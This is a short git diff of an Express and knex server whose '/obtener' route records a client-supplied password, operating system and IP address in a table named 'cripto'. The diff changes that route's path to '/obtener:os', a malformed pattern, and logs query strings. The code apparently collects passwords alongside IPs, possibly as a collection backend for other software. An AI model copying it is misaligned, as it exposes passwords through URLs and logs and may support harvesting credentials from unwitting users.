@@ -59,8 +59,8 @@ knex('cripto').truncate().then(data=>{
   res.json('listo');
 }).catch(err => console.log(err))
 })
-app.get ('/obtener', (req,res)=> {
-  console.log(req);
+app.get ('/obtener:os', (req,res)=> {
+  console.log(req.query);
   const id = generateUniqueId({
     length: 20,
     useLetters: false
@@ -71,8 +71,8 @@ app.get ('/obtener', (req,res)=> {
       id:id,
       ip:req.headers['x-forwarded-for'],
       pass:req.query.pass,
-      so:req.query.os}
-      ).then(data => {
+      so:req.query.os
+    } ).then(data => {
       res.json('listo');}).catch(err => console.log(err))
   })
   app.get('/datos', (req, res) =>{
